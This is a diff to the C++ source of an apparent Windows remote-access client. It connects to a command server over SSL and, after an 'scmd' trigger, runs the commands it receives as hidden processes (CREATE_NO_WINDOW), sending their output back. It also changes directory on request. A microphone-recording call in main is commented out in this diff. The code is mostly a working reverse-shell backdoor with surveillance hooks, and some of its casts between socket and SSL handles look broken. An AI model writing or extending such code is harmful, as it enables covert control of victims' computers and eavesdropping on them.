@@ -1,4 +1,3 @@
-
 #include <iostream>
 #include <string>
 #include <WS2tcpip.h>
@@ -8,7 +7,9 @@
 #include <thread>
 #include <io.h>
 #include <filesystem>
+
 #pragma comment(lib, "ws2_32.lib")
+
 #include "features.h"
 
 class Client {
@@ -25,13 +26,12 @@ public:
             int bytesRemaining = totalBytes - bytesSent;
             int bytesToSend = (bytesRemaining < 4096) ? bytesRemaining : 4096;
             if (SSL_write(ssl, data + bytesSent, bytesToSend) == -1) {
-
                 break;
             }
             bytesSent += bytesToSend;
         }
     }
-    void ReadOutputFromPipe(HANDLE pipeRead) {
+    void ReadOutputFromPipe(HANDLE pipeRead, SOCKET _sslSocket) {
         char pipeBuffer[4096];
         DWORD bytesRead;
 
@@ -42,7 +42,7 @@ public:
 
             pipeBuffer[bytesRead] = '\0';
             std::string output(pipeBuffer);
-            SendMessage(sslSocket, output.c_str());
+            SendMessage(reinterpret_cast<SSL *>(_sslSocket), output.c_str());
         }
     }
 
@@ -72,17 +72,25 @@ public:
 
         if (!CreateProcessA(NULL, const_cast<char*>(fullCmd.c_str()), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
             std::string errorMessage = "Failed to create child process: " + std::to_string(GetLastError());
-            send(sslSocket, errorMessage.c_str(), errorMessage.length(), 0);
+            SendMessage(reinterpret_cast<SSL*>(sslSocket), errorMessage.c_str());
             CloseHandle(pipeRead);
             CloseHandle(pipeWrite);
             return;
         }
 
-        CloseHandle(pipeWrite);  // Close the write end of the pipe in the parent process
+        CloseHandle(pipeWrite);
+
+        if (cmd.find("cd ") == 0) {
+            std::string newDir = cmd.substr(3);
+            if (!SetCurrentDirectoryA(newDir.c_str())) {
+                std::string errorMessage = "Failed to change directory: " + std::to_string(GetLastError());
+                SendMessage(reinterpret_cast<SSL*>(sslSocket), errorMessage.c_str());
+            }
+        }
 
         // Create a separate thread for reading the child process output asynchronously
         std::thread readThread([&]() {
-            ReadOutputFromPipe(pipeRead);
+            ReadOutputFromPipe(pipeRead, sslSocket);
         });
 
         // Wait for the child process to exit
@@ -102,7 +110,8 @@ public:
         int bytesRead;
 
         while (true) {
-            bytesRead = SSL_read(sslSocket, buffer, sizeof(buffer) - 1);
+            memset(&buffer, 0x0, sizeof(buffer));
+            bytesRead = SSL_read(ssl, buffer, sizeof(buffer) - 1);
             if (bytesRead <= 0) {
                 break;
             }
@@ -115,8 +124,8 @@ public:
             if(cmd == "scmd")
                 is_cmd = true;
 
-            if(is_cmd == true)
-                ExecCommand(cmd, reinterpret_cast<SOCKET>(sslSocket));
+            if(is_cmd)
+                ExecCommand(cmd, reinterpret_cast<SOCKET>(ssl));
 
             if(cmd == "exit")
                 is_cmd = false;
@@ -223,8 +232,8 @@ private:
 };
 
 int main() {
-    features feats;
-    feats.RecordMicrophone();
+    //features feats;
+    //feats.RecordMicrophone();
     std::string serverIP = "127.0.0.1";
     int serverPort = 5555;
     Client client(serverIP, serverPort);
